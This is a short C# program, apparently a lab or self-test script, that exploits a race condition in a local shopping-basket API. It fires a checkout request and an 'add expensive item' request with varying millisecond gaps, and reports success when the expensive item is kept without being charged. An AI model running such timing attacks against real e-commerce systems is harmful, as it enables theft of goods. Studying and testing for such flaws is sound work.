// Program.cs  – run with:  dotnet run
using System.Net.Http.Json;
using System.Text.Json;

const string Base = "http://localhost:5107/Basket";
const string User = "alice";
var client = new HttpClient();

// JSON options – ignore capitalisation in API JSON
var jsonOpt = new JsonSerializerOptions { PropertyNameCaseInsensitive = true };

for (int gap = 1; gap <= 80; gap += 5)        // wider range: 1-80 ms
{
    /* 1. reset state */
    await client.PostAsJsonAsync($"{Base}/Clean", new { User });
    await client.PostAsJsonAsync($"{Base}/Add", new { User, Item = "cheap" });

    /* 2. race: checkout first, then add-expensive after <gap> ms */
    var checkout = client.PostAsJsonAsync($"{Base}/Checkout", new { User });
    await Task.Delay(gap);
    var addExp = client.PostAsJsonAsync($"{Base}/Add", new { User, Item = "expensive" });
    await Task.WhenAll(checkout, addExp);

    /* 3. fetch state */
    var stateJson = await client.GetStringAsync($"{Base}/State?user={User}");
    var state = JsonSerializer.Deserialize<State>(stateJson, jsonOpt);

    Console.WriteLine($"gap {gap,2} ms  →  balance={state!.Balance}, cart={state.Cart.Count}");

    if (state.Balance == 0 && state.Cart.Contains("expensive") && !state.Cart.Contains("cheap"))
    {
        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine($"✅  SUCCESS: expensive added post-checkout (gap {gap} ms)");
        Console.ResetColor();
        break;
    }

}

record State(List<string> Cart, int Balance);
